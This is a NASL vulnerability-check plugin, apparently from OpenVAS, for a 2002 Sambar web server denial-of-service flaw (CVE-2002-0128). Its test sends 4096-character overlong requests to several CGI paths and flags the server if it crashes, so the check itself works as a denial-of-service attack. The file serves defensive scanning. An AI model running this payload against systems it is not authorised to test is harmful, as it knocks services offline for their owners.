if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.11131" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_bugtraq_id( 3885 );
	script_name( "Sambar web server DOS" );
	script_cve_id( "CVE-2002-0128" );
	script_category( ACT_DENIAL );
	script_copyright( "Copyright (C) 2002 Michel Arboi" );
	script_family( "Denial of Service" );
	script_dependencies( "gb_sambar_server_detect.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "sambar_server/detected" );
	script_tag( name: "impact", value: "An attacker may use this flaw to make your server crash
  continuously, preventing you from working properly." );
	script_tag( name: "solution", value: "Upgrade your server to Sambar 51p or delete those CGI." );
	script_tag( name: "summary", value: "It is possible to kill the Sambar web server 'server.exe'
  by sending it a long request like:

  - /cgi-win/testcgi.exe?XXXX...X

  - /cgi-win/cgitest.exe?XXXX...X

  - /cgi-win/Pbcgi.exe?XXXXX...X (or maybe in /cgi-bin/)" );
	script_tag( name: "affected", value: "Sambar WebServer v5.1." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "remote_vul" );
	exit( 0 );
}
require("http_func.inc.sc");
require("port_service_func.inc.sc");
port = http_get_port( default: 80 );
if(http_is_dead( port: port )){
	exit( 0 );
}
func test_port( port, cgi ){
	url = NASLString( cgi, "?", crap( 4096 ) );
	req = http_get( item: url, port: port );
	res = http_send_recv( port: port, data: req );
	if( isnull( res ) ) {
		return TRUE;
	}
	else {
		return FALSE;
	}
}
for dir in make_list( "/cgi-bin",
	 "/cgi-win" ) {
	for file in make_list( "/cgitest.exe",
		 "/testcgi.exe",
		 "/Pbcgi.exe" ) {
		if(test_port( port: port, cgi: dir + file )){
			break;
		}
	}
}
if(http_is_dead( port: port )){
	security_message( port: port );
	exit( 0 );
}
exit( 99 );

